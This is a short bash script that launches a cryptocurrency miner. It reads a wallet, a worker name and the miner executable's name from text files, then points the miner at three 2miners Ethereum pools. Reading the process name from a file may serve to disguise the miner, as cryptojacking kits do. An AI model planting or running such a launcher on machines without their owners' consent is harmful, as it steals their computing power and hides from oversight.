#!/bin/bash

Wallet=$(cat wl.txt)
Uuname=$(cat inuser.txt)
date=$(cat date.txt)
USEPROCNAME=$(cat SETPROCNAME.txt)
farmrecheck=$(shuf -i 200-300 -n 1)
namenday="$Uuname"-"$date"

./$USEPROCNAME --farm-recheck $farmrecheck -U \
                    -P stratum1+tcp://$Wallet.$namenday@us-eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@eth.2miners.com:2020 \
                    -P stratum1+tcp://$Wallet.$namenday@asia-eth.2miners.com:2020
